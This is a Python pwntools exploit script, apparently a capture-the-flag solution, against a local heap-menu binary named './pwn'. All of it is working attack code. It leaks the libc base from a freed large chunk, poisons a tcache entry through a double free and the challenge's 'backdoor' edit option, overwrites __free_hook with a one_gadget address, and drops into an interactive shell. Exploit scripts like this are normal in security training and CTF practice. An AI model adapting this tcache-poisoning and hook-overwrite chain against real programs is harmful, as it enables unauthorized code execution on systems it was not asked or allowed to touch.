from pwn import *
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n, timeout=1).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True, timeout=1).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True, timeout=1).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
sh     = lambda      : io.interactive()
menu   = b'select your choice : '
def add(size):
	sla(menu, b'1')
	sla(b'eth? : ', byte(size))

def add_size(idx, n):
	sla(menu, b'2')
	sla(b'no : ', byte(idx))
	sla('sit? : ', byte(n))

def dele(idx, n):
	sla(menu, b'3')
	sla(b'no : ', byte(idx))
	sla(b'raw? : ', byte(n))

def show():
	sla(menu, b'4')

def backdoor(idx, fd):
	sla(menu, b'6')
	sla(b'no : ', byte(idx))
	sla(b'eth : ', fd)

add(0x410) # 0
add(0x10)  # 1
dele(0, 0x410)
show()
rut(b'ballance ')
libc.address = int(rut(b'\n'), 10) - 0x3ebca0
print("\033[32m[libc_base -> "+str(hex(libc.address))+"]\033[0m")
realloc = libc.sym.realloc
free_hook = libc.sym.__free_hook
malloc_hook = libc.sym.__malloc_hook
ones = [0x4f2c5, 0x4f322, 0x10a38c]
ones = [i+libc.address for i in ones]
dele(1, 0x10)
dele(1, 0)
backdoor(1, p64(free_hook))
add(0x10)  # 2
add(0x10)  # 3
backdoor(3, p64(ones[1]))
dele(2, 0x10)
#debug()
sh()
